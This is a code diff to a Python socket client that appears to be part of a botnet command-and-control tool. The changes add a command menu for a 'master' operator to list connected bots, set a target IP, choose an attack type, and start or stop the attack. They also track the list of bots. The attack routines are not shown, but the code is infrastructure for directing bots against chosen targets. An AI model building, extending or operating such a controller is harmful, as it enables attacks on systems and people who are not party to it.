@@ -19,20 +19,33 @@ class Send(threading.Thread):
         self.attktype = ''
         self.targetip = ''
 
+    def showcommands(self):
+        print('\n'*2)
+        print('='*10)
+        print('Commands:\niam:{master or bot} ; Identifies client to server\nlistbot: ; Requests a list of connected bots\n\
+changeip:{target_ip} ; Sets target IP\nchangeattk:{attack_type} ; Sets attack type\nstartattk: ; Executes chosen attack\n\
+stopattk: ; Terminates attack if it is being executed\ndisconnect: ; Disconnects from server') 
+        print('='*10)
+
 
     def run(self):
-        print('Can enter commands now.')
+        
         while True:
+            self.showcommands()
+            print('\nEnter Command: ')
             sys.stdout.flush()
             message = sys.stdin.readline()[:-1]
 
-            if message.upper() == 'DISCONNECT':
+            if message.upper() == 'DISCONNECT:':
                 self.disconnect()
                 print('Quitting...')
                 self.sock.close()
                 os._exit(0)
             else:
                 self.sock.sendall(message.encode(ENCODING))
+                if message == '^C':
+                    print('message is control')
+                print(f'Sent {message} to server')            
 
     
     def changeip(self):
@@ -141,6 +154,7 @@ class Client:
         self.type = type
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.authenticated = False
+        self.botlist = ''
 
     def start(self) -> None:
         print(f'Connecting to {self.host}:{self.port}...')
@@ -153,6 +167,9 @@ class Client:
             if self.type == 'master':
                 send = Send(self.sock)
                 send.start()
+            while True:
+                if receive.botlist:
+                    self.botlist = receive.botlist
         except KeyboardInterrupt:
             print("caught keyboard interrupt, exiting")
             self.sock.close()
@@ -160,6 +177,11 @@ class Client:
         
 
         return
+
+
+    def getBotList(self):
+        print(f'Bots: {self.botlist}')
+
 
     def set_authenticated(self) -> None:
         self.authenticated = True
